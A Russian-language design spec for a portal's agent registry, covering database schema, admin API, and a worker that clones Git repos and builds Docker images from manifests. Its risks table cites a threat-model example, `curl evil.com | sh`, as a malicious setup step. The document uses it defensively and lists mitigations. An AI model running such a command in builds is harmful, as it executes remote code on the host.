# План 1.2.2 «Реестр агентов» — Git-clone + Docker build (Спек)

**Статус:** дизайн зафиксирован, готов к написанию плана реализации.
**Часть Спека 1.** Третий под-план декомпозиции Плана 1.2:

- 1.2.1 Скелет — FastAPI + Postgres + Alembic + auth ✅ (PR #2, тег `portal-api-v0.1.0`)
- **1.2.2 Реестр агентов** ← этот документ — `tabs` / `agents` / `agent_versions` + Git-clone + Docker build
- 1.2.3 Запуск задач — `jobs` / worker / Docker-runner / WebSocket-стрим
- 1.2.4 OpenRouter-прокси + квоты

## 1. Цель и контекст

После merge 1.2.1 у портала есть auth-инфраструктура и admin-роли, но нет ни одного агента, которого можно запустить. Цель 1.2.2 — научить портал **принимать студенческого агента из Git-репозитория**, валидировать его, собирать Docker-образ и держать в реестре. На этом этапе видимый результат для оператора:

- Админ через `curl` создаёт вкладку, добавляет агента по Git URL, дожидается статуса `ready`, видит образ `portal/agent-<slug>:v<sha7>` в `docker images`.
- Любой залогиненный юзер `GET /api/agents` видит этого агента в списке плиток (frontend будет рендерить — это для 1.3).
- Сама задача (jobs) ещё не запускается — это 1.2.3, который сядет на готовый `agent_versions.docker_image_tag`.

**Что МОЖНО сделать после merge 1.2.2:**

- Параллельно стартует План 1.2.3 (jobs) — ему нужны готовые `agent_versions` с docker_image_tag и manifest.runtime.limits.
- Параллельно стартует План 1.2.4 (OpenRouter-прокси + квоты) — независимо от реестра агентов.
- Frontend (1.3) получает API для главной и страницы агента (`GET /api/tabs`, `GET /api/agents`, `GET /api/agents/{slug}`).

## 2. Scope

### Входит ✅

- Реестр **вкладок** (`tabs`), **агентов** (`agents`), **версий агента** (`agent_versions`) в Postgres. Миграция Alembic `0002_registry`.
- Bootstrap 4 системных вкладок (3 канонические из контракта + `uncategorized`).
- Добавление агента **только по Git https-URL**. Админ вводит URL + git ref (branch / tag / sha) → портал клонит → парсит manifest через `portal_sdk.manifest.AgentManifest` → создаёт запись `agent_versions(status='pending_build')` → enqueue в RQ → worker генерирует Dockerfile из manifest, инжектит SDK, выполняет `docker build` → пишет статус в БД.
- **Worker** (`apps/portal-worker/`) как новый сервис в docker-compose: RQ-консьюмер с доступом к `/var/run/docker.sock`. Пустой каркас под job-runner для 1.2.3.
- **Admin endpoints** (CRUD): `tabs`, `agents` (включая enable/disable, move-to-tab, delete), `agent_versions` (список, build_log, set_current, retry, delete-if-no-jobs).
- **Public endpoints**: `GET /api/tabs`, `GET /api/agents`, `GET /api/agents/{slug}` — то, что юзер увидит на главной.
- **Manifest source of truth** — `portal-api` и `portal-worker` импортируют `portal-sdk` как локальный path-dep → одна Pydantic-схема в SDK, API и worker. Никакой дубль-валидации.
- pytest-тесты на реальном Postgres + Redis через `testcontainers`, реальный `docker build` для end-to-end теста на echo-агенте, ≥85% coverage.
- README в `apps/portal-api/` дополнен секцией «Регистрация агента» — полный сценарий через curl от логина админа до `GET /api/agents`.

### Сознательно отложено ⏭

- ZIP-аплоад и «С нуля» (in-browser редактор manifest+agent.py) → отдельный План **1.2.5** (или позже).
- Job queue runner (запуск задач, контейнер на job, WebSocket-стрим прогресса) → План **1.2.3**.
- OpenRouter-прокси, квоты, биллинг → План **1.2.4**.
- Frontend → План **1.3**.
- Webhook на Git push (admin re-clone'ит вручную через POST `/agents/{id}/versions`).
- Streaming build-логов в админку через WebSocket (polling `GET /agent_versions/{id}` хватает).
- Авто-cleanup старых docker images по cron (только при явном `DELETE /agent_versions/{id}`).
- Migration manifest schema v0.1 → v0.2 (отложено до Спека 2 — первого реального breaking change).

### Сознательно НЕ делаем 🚫

- Private Git, GitHub PAT, SSH-deploy-keys — только публичные https-URL.
- Pre-built portal-base image со встроенным SDK (вместо этого SDK копируется в build context каждой сборки — проще, без двойной публикации).
- Audit log в отдельной таблице (`structlog` + `agent_versions.created_by_user_id` хватает).
- Soft-delete для tabs / agents / versions.
- Авто-bump current_version при успешном новом билде. Админ всегда вручную делает `set_current`.
- Парсинг и использование `Dockerfile` из репозитория агента (если есть). Студенческий Dockerfile **игнорируется**, портал генерирует свой из `manifest.runtime.docker.{base_image, setup, entrypoint}`.

### Принципы

- Слои те же, что в 1.2.1: `routers → services → repositories`. Никакой бизнес-логики в роутерах.
- `portal-sdk` как path-dependency: `portal-sdk @ file:../../packages/portal-sdk-python` в `pyproject.toml` API и worker'а. Один источник Pydantic-схемы manifest.

## 4. Модель данных

### Миграция `0002_registry`

Создаёт три таблицы, индексы и функцию-триггер `set_updated_at()` (если ещё нет от 1.2.1).

### `tabs`

| Поле | Тип | Заметки |
|---|---|---|
| `id` | UUID PK | `gen_random_uuid()` |
| `slug` | text UNIQUE NOT NULL | латиница + `-`, попадает в URL и совпадает с `manifest.category` |
| `name` | text NOT NULL | человекочитаемое, на русском |
| `icon` | text NULL | emoji или путь к PNG |
| `order_idx` | int NOT NULL | сортировка в сайдбаре, default 0 |
| `is_system` | bool NOT NULL | `true` для `uncategorized` (нельзя удалять, slug нельзя менять) |
| `created_at` | timestamptz NOT NULL | default `now()` |
| `updated_at` | timestamptz NOT NULL | trigger ON UPDATE |

**Bootstrap** (`apps/portal-api/portal_api/bootstrap.py`, расширение существующего): если таблица `tabs` пустая, создаём четыре строки:

| slug | name | icon | order_idx | is_system |
|---|---|---|---|---|
| `научная-работа` | Научная работа | 🔬 | 10 | false |
| `учебная` | Учебная | 📘 | 20 | false |
| `организационная` | Организационная | 🗂 | 30 | false |
| `uncategorized` | Без категории | ❓ | 999 | true |

Slug'и каноничных трёх берутся из `portal_sdk.manifest.CategoryStrict`.

### `agents`

| Поле | Тип | Заметки |
|---|---|---|
| `id` | UUID PK | |
| `slug` | text UNIQUE NOT NULL | равен `manifest.id` первой принятой версии |
| `name` | text NOT NULL | кеш из `current_version.manifest.name` |
| `icon` | text NULL | кеш из `current_version.manifest.icon` |
| `short_description` | text NOT NULL | кеш из `current_version.manifest.short_description` |
| `tab_id` | UUID FK tabs(id) ON DELETE RESTRICT NOT NULL | мутируется через PATCH /admin/agents/{id} |
| `current_version_id` | UUID FK agent_versions(id) ON DELETE RESTRICT NULLABLE | NULL пока нет ни одной готовой версии |
| `enabled` | bool NOT NULL | default `false`. Toggle on допустим только когда `current_version_id IS NOT NULL` |
| `git_url` | text NOT NULL | https-URL репо, immutable |
| `created_by_user_id` | UUID FK users(id) ON DELETE RESTRICT NOT NULL | какой админ добавил |
| `created_at` | timestamptz NOT NULL | |
| `updated_at` | timestamptz NOT NULL | trigger |

`name`/`icon`/`short_description` денормализованы в `agents` (кеш для public listing, чтобы не джойнить `agent_versions` на каждый `GET /api/agents`). Кеш обновляется атомарно при `set_current_version`.

### `agent_versions`

| Поле | Тип | Заметки |
|---|---|---|
| `id` | UUID PK | |
| `agent_id` | UUID FK agents(id) ON DELETE RESTRICT NOT NULL | RESTRICT — нельзя удалить агента, пока есть версии |
| `git_sha` | text NOT NULL | полный 40-символьный SHA, резолвится из git-ref в момент клона |
| `git_ref` | text NOT NULL | то, что ввёл админ (branch / tag / short-sha) — для отображения |
| `manifest_jsonb` | jsonb NOT NULL | целый manifest как JSON (snapshot, frozen) |
| `manifest_version` | text NOT NULL | копия `manifest.version` для display и фильтров |
| `docker_image_tag` | text NULL | `portal/agent-<slug>:v<sha7>` после успешного билда; NULL до этого |
| `status` | text NOT NULL CHECK (`status IN ('pending_build','building','ready','failed')`) | |
| `build_log` | text NULL | многострочный stdout+stderr docker build (truncate'ится на 1 MB) |
| `build_started_at` | timestamptz NULL | |
| `build_finished_at` | timestamptz NULL | |
| `build_error` | text NULL | короткое summary ошибки; NULL если status≠failed |
| `created_by_user_id` | UUID FK users(id) ON DELETE RESTRICT NOT NULL | |
| `created_at` | timestamptz NOT NULL | |

**Возможные значения `build_error`** (фиксированный список):

`clone_failed`, `repo_too_large`, `manifest_not_found`, `manifest_invalid`, `base_image_not_allowed`, `build_timeout`, `image_too_large`, `docker_error`, `worker_restart`.

### Индексы

- `tabs.slug` — UNIQUE constraint.
- `agents.slug` — UNIQUE constraint.
- `agents(tab_id)` — для фильтра в админке.
- `agents(enabled, current_version_id) WHERE enabled = true AND current_version_id IS NOT NULL` — partial, для `GET /api/agents`.
- `agent_versions(agent_id, git_sha)` — UNIQUE constraint (одна и та же SHA дважды не добавляется в одного агента).
- `agent_versions(agent_id, created_at DESC)` — для админского listing.
- `agent_versions(status) WHERE status IN ('pending_build','building')` — partial, для worker-recovery и health monitoring.

### Future-proof FK для 1.2.3

В этом плане таблицы `jobs` нет — её создаст 1.2.3. `jobs.agent_version_id → agent_versions(id) ON DELETE RESTRICT` появится тогда. Здесь ничего лишнего не создаём.

### Cleanup на удалении

- `DELETE /api/admin/agent_versions/{id}` — проверка `id ≠ agents.current_version_id`; удаляем БД row + best-effort `docker rmi <tag>` (ошибка rmi не блокирует, идёт в WARN-лог).
- `DELETE /api/admin/agents/{id}` — только если у агента 0 версий.
- `DELETE /api/admin/tabs/{id}` — только если у tab 0 агентов; для `is_system=true` — 403.

## 5. API endpoints

Все под префиксом `/api`, JSON, общий формат ошибки из 1.2.1. Cookies (HttpOnly access+refresh, Path=/api, SameSite=Strict) и Origin-check на `POST/PATCH/DELETE` — без изменений.

### Public (`Depends(get_current_user)`, любой залогиненный)

| Method | Path | Что делает |
|---|---|---|
| `GET` | `/api/tabs` | Список вкладок: `[{id, slug, name, icon, order_idx}]`. Сортировка `order_idx ASC, name ASC`. `uncategorized` исключается из ответа, если в нём нет ни одного enabled-агента. |
| `GET` | `/api/agents` | Список enabled-агентов с готовой `current_version`. Поля: `{id, slug, name, icon, short_description, tab: {slug, name}, current_version: {id, manifest_version, git_sha}}`. `manifest_jsonb` НЕ возвращаем (большой; для рендера формы есть отдельный endpoint). |
| `GET` | `/api/agents/{slug}` | Полная карточка одного агента + полный `manifest` `current_version`'а (для рендера формы запуска). 404 если slug не существует или агент disabled. |

### Admin: tabs (`Depends(require_admin)`)

| Method | Path | Что делает |
|---|---|---|
| `GET` | `/api/admin/tabs` | Все вкладки включая `uncategorized` и пустые. |
| `POST` | `/api/admin/tabs` | `{slug, name, icon?, order_idx?}`. 409 `TAB_SLUG_TAKEN` если slug дублируется. |
| `PATCH` | `/api/admin/tabs/{id}` | Менять `name`, `icon`, `order_idx`. Для `is_system=true` slug нельзя; остальное можно. |
| `DELETE` | `/api/admin/tabs/{id}` | 409 `TAB_NOT_EMPTY` если есть агенты; 403 `TAB_IS_SYSTEM` для системных. |

### Admin: agents

| Method | Path | Что делает |
|---|---|---|
| `GET` | `/api/admin/agents` | Все агенты включая disabled. Фильтры `?tab_id=`, `?enabled=true|false`. Поле `latest_version: {id, status, git_sha, created_at}` для мгновенного видения «есть ли висящий билд». |
| `GET` | `/api/admin/agents/{id}` | Полная карточка + список последних 20 версий. |
| `POST` | `/api/admin/agents` | `{git_url, git_ref}` (ref может быть branch/tag/sha; default `main`). Поведение: (1) ранняя резолюция ref→SHA через `git ls-remote` без полного клона (валидация что ref существует), (2) клон во временной директории воркера через RQ-job, (3) парсинг manifest, (4) lookup tab по `manifest.category` (fallback `uncategorized`), (5) создание `agents` row + первой `agent_versions(status='pending_build')`, (6) enqueue в RQ, (7) ответ `201 {agent: {...}, version: {id, status: 'pending_build'}}`. Если `agents.slug` уже есть → 409 `AGENT_SLUG_TAKEN`. |
| `PATCH` | `/api/admin/agents/{id}` | Менять `tab_id` (move-between-tabs), `enabled`. Toggle on допустим только если `current_version_id IS NOT NULL`, иначе 409 `NO_READY_VERSION`. |
| `DELETE` | `/api/admin/agents/{id}` | 409 `AGENT_HAS_VERSIONS` если версий > 0 (админ сначала удаляет все версии). |

### Admin: agent versions

| Method | Path | Что делает |
|---|---|---|
| `GET` | `/api/admin/agents/{id}/versions` | Список версий агента: `[{id, git_ref, git_sha, manifest_version, status, build_started_at, build_finished_at, build_error, is_current}]`. Сорт `created_at DESC`. |
| `GET` | `/api/admin/agent_versions/{id}` | Полная карточка одной версии включая `build_log` и `manifest_jsonb`. |
| `POST` | `/api/admin/agents/{id}/versions` | `{git_ref}`. Резолвит ref→SHA, проверяет уникальность `(agent_id, git_sha)` (409 `VERSION_ALREADY_EXISTS`), создаёт row + enqueue билд. **Не** меняет current_version автоматически. |
| `POST` | `/api/admin/agent_versions/{id}/set_current` | Указать как current. 409 `VERSION_NOT_READY` если status ≠ ready. Атомарно копирует `name`/`icon`/`short_description` из manifest в `agents`. |
| `POST` | `/api/admin/agent_versions/{id}/retry` | Только для status=failed. Сбрасывает `status` в `pending_build`, чистит `build_log`/`build_error`/`build_started_at`/`build_finished_at`, enqueue в RQ. 400 `RETRY_NOT_FAILED` если status ≠ failed. |
| `DELETE` | `/api/admin/agent_versions/{id}` | 409 `VERSION_IS_CURRENT` если эта версия — current. (В 1.2.3 добавится 409 `VERSION_HAS_JOBS`.) Удаляет row + best-effort `docker rmi`. |

### Error codes (новые в 1.2.2)

| HTTP | code | Когда |
|---|---|---|
| 400 | `INVALID_GIT_URL` | не https / не git-валидный |
| 400 | `INVALID_GIT_REF` | нельзя зарезолвить в SHA через `git ls-remote` |
| 400 | `MANIFEST_INVALID` | Pydantic-ошибка валидации, `details` массив |
| 400 | `MANIFEST_NOT_FOUND` | нет `manifest.yaml` в корне репо |
| 400 | `BASE_IMAGE_NOT_ALLOWED` | `manifest.runtime.docker.base_image` не в whitelist |
| 400 | `REPO_TOO_LARGE` | репо после clone больше 50 MB |
| 400 | `RETRY_NOT_FAILED` | retry на не-failed версии |
| 403 | `TAB_IS_SYSTEM` | удалить/переименовать-slug системной вкладки |
| 404 | `AGENT_NOT_FOUND` / `TAB_NOT_FOUND` / `VERSION_NOT_FOUND` | |

## 6. Build pipeline (worker)

Worker получает RQ-job `build_agent_version(version_id: UUID)` и выполняет шаги ниже. Каждая фаза обновляет `agent_versions` в одной транзакции; ошибка любой фазы → `status='failed'` + `build_error=<code>` + текст в `build_log`. На входе и выходе `tempdir` под `/tmp/portal-build-<version_id>/` гарантированно удаляется в `try/finally`.

### Этапы

**0. Pre-flight.** Подгружаем `version` из БД, проверяем `status='pending_build'`, ставим `status='building'` + `build_started_at=now()`. Если status уже `building` — выходим (защита от дубль-enqueue).

**1. Clone.**

- Создаём `tempdir = /tmp/portal-build-<version_id>/`.
- `git clone --depth=1 --branch <git_ref> <git_url> tempdir/repo` (если ref — это полный SHA, fallback: `git clone <url> repo && git checkout <sha>`).
- После clone — `git rev-parse HEAD` в repo → должен совпасть с `agent_versions.git_sha`, который ранее сохранил admin endpoint через `git ls-remote`. Если не совпадает (race c push) → `clone_failed`.
- `du -sb tempdir/repo` > **50 MB** → `repo_too_large`.
- Таймаут на clone 60 секунд (`subprocess.run(timeout=60)`); превышение → `clone_failed`.

**2. Manifest parse.**

- Читаем `tempdir/repo/manifest.yaml`. Нет файла → `manifest_not_found`.
- `portal_sdk.manifest.AgentManifest.model_validate(yaml.safe_load(...))`. Pydantic-ошибка → `manifest_invalid`, дамп ошибок в `build_log`.
- Доп. валидации поверх Pydantic:
  - `manifest.id == agents.slug` (consistency; иначе `manifest_invalid: id_mismatch` в build_log).
  - `manifest.runtime.docker.base_image` ∈ whitelist (`python:3.11-slim`, `python:3.12-slim`, `python:3.13-slim`) → иначе `base_image_not_allowed`.
- Снепшот manifest в `agent_versions.manifest_jsonb` (`json.dumps(model.model_dump(mode='json'))`). Поле `manifest_version` в той же UPDATE из `model.version`.

**3. Build context подготовка.**

- Создаём `tempdir/build/`.
- Копируем содержимое `tempdir/repo/` в `tempdir/build/` (`shutil.copytree`, `dirs_exist_ok=True`).
- Копируем `/portal-sdk/` (read-only volume) в `tempdir/build/.portal-sdk/`.
- Генерируем `tempdir/build/Dockerfile.portal` (см. ниже).
- Студенческий `Dockerfile`, если есть в репо, **игнорируется**. Полностью используем сгенерированный.

**4. Dockerfile генерация.**

Шаблон (заполняется из manifest):

```dockerfile
FROM {base_image}

ENV PYTHONUNBUFFERED=1 PYTHONDONTWRITEBYTECODE=1
WORKDIR /agent

# SDK устанавливается первым — отдельный layer для кеширования.
COPY .portal-sdk /sdk
RUN pip install --no-cache-dir /sdk

# Setup студента из manifest.runtime.docker.setup
{setup_lines}

# Код агента
COPY . /agent
RUN rm -rf /agent/.portal-sdk /agent/Dockerfile.portal

# Non-root
RUN useradd --create-home --shell /bin/bash agent && chown -R agent:agent /agent
USER agent

ENTRYPOINT {entrypoint_json}
```

- `{base_image}` — `manifest.runtime.docker.base_image` (валидированный из whitelist).
- `{setup_lines}` — каждая строка из `manifest.runtime.docker.setup` оборачивается в `RUN <line>`.
- `{entrypoint_json}` — `json.dumps(manifest.runtime.docker.entrypoint)` (всегда exec-form).

**5. Docker build.**

- Через **Docker Engine SDK** (`docker.from_env().images.build(...)`), не subprocess.
- Параметры: `tag='portal/agent-<slug>:v<sha7>'`, `dockerfile='Dockerfile.portal'`, `path=tempdir/build/`, `pull=True` (для base_image), `forcerm=True`, `rm=True`, `nocache=False` (стандартный layer-кеш Docker'а используется), `network_mode=None` (без `--network=none` — иначе `pip install` сломается).
- Параметры ресурсов на build передаются через `container_limits={'memory': 2*1024**3}` (2 GB).
- Stream'им build-логи в память (lines list); финальная запись `'\n'.join(lines)[-1_000_000:]` → `agent_versions.build_log` (truncate последних 1 MB).
- Таймаут билда **10 минут**: оборачиваем `images.build()` в `concurrent.futures.ThreadPoolExecutor` с `timeout=600`; превышение → kill всех intermediate-контейнеров через `docker.containers.list(filters={'label': f'portal-build={version_id}'})` (build context добавляет лейбл) → `build_timeout`.
- Любое исключение Docker engine не из таймаута → `docker_error`, exception str в `build_log`.

**6. Image size check.** `docker.images.get(<tag>).attrs['Size']` > **2 GB** → `docker rmi <tag>` → `image_too_large`.

**7. Smoke test.** `docker run --rm --network=none --memory=256m portal/agent-<slug>:v<sha7> --help` с таймаутом 10 секунд. Любой exit-code (включая ненулевой) — ОК; цель убедиться, что image вообще запускается. Если docker engine отказался запускать (corrupted image) → `docker_error`. Это «низкий приоритет» шаг — если в имплементации задерживает, можно опустить (план оставит как опциональный финальный таск).

**8. Финализация.**

- Успех: `status='ready', docker_image_tag=<tag>, build_finished_at=now()`.
- Ошибка: `status='failed', build_error=<code>, build_finished_at=now()`.
- `tempdir` удаляется в `try/finally`.

### Worker сервис (`apps/portal-worker/`)

`portal_worker/main.py`:

### Worker security

- Worker non-root, в группе `docker` (`useradd ... -G docker` в Dockerfile worker'а). Это даёт доступ к `/var/run/docker.sock` без `--privileged`.
- Сборки на хостовом docker daemon — riskhood документирован в Секции 9. Закрытый портал (только админы добавляют агентов через invite) держит этот риск в норме.
- На самом `docker build` сетевая изоляция НЕ применяется (`pip install` нужен интернет). Лимит памяти 2 GB на build предотвращает OOM хоста.
- Запуск самого агента (1.2.3) уже будет с `--network=none` и `--read-only` — это другой план.

## 9. Риски

| Риск | Импакт | Митигация |
|---|---|---|
| Студенческий агент в `setup` запускает `curl evil.com \| sh` или ставит майнер | Высокий по докер-демону хоста | (1) Только админ может добавлять агентов, инвайты — закрытый круг. (2) `--memory=2g` на build, timeout 10 мин, base_image whitelist. (3) Sandbox исполнения агента (`--network none`, `--read-only`) приходит в 1.2.3 — здесь риск только на этапе билда. (4) Worker non-root, в группе docker (не `--privileged`). |
| Docker daemon на хосте перегружен (десятки висящих images / volumes от старых билдов) | Средний | Cleanup при `DELETE /agent_versions/{id}` (`docker rmi`). Раз в неделю руками `docker system prune -af` на Mac Mini — задокументируем в README. Авто-cron — отложен. |
| API ушёл в рестарт пока worker строит → версия в `building` навсегда | Средний | `recover_orphaned_builds()` на старте worker'а: `UPDATE agent_versions SET status='failed', build_error='worker_restart' WHERE status='building'`. Админ делает retry. |
| `testcontainers` под ARM64 + Docker-в-Docker на CI | Средний | Postgres 16 и Redis 7 — multi-arch, есть. Build-тесты проверяем ручным запуском на Mac Mini до PR. CI настраиваем в Спеке 5. |
| `portal-sdk` обновлён, но образы агентов собраны со старой SDK → runtime mismatch | Низкий-средний | (1) `portal_sdk.__version__` пишется в `agent_versions.manifest_jsonb._sdk_version` как metadata при билде. (2) При мажорном bump'е SDK админ делает batch-retry скриптом (отложено в 1.5). На MVP SDK 0.1.x не ломает совместимость. |
| Git-сервер студента отвалился во время clone | Низкий | Таймаут 60с → `clone_failed` → admin видит ошибку → retry. |
| Race: два админа одновременно добавляют один и тот же `git_url`+`git_ref` | Низкий | UNIQUE `(agent_id, git_sha)` constraint в БД. Второй insert 23505 → 409 в API. |
| Worker умер посреди билда → `tempdir` не очищен | Низкий | `tempdir` под `/tmp/portal-build-*` — Mac Mini сам чистит при перезагрузке. На worker-старте `shutil.rmtree('/tmp/portal-build-*', ignore_errors=True)`. |
| Manifest валиден, но `setup` ломается (`pip install non-existent-package`) | Ожидаемо | `docker_error` + полный build_log в БД. Админ читает, говорит студенту. Это feature, не bug. |
| Image-tag коллизия (два разных репо с одинаковым slug) | Низкий | `agents.slug` UNIQUE — два разных репо с одинаковым `manifest.id` не зарегистрируются вторым. |

## 10. Открытые вопросы

| Вопрос | Решение |
|---|---|
| Хранить ли git_url с username/password (basic auth)? | Нет. Только публичные https без auth. PAT/SSH — отдельный план. |
| Нужен ли publicly-discoverable agent registry endpoint без auth? | Нет. `GET /api/agents` под auth. На MVP портал закрытый. |

| Сборка нескольких версий параллельно? | Да, RQ worker может запускать несколько процессов. На MVP запускаем 1 worker process — этого достаточно (билды не частые). |
| Что делать с echo/Dockerfile в репо после переезда? | Оставляем как есть с комментарием для local-dev. Портал его игнорирует. План включит таск «обновить комментарий в `agents/echo/Dockerfile` про новый build flow». |
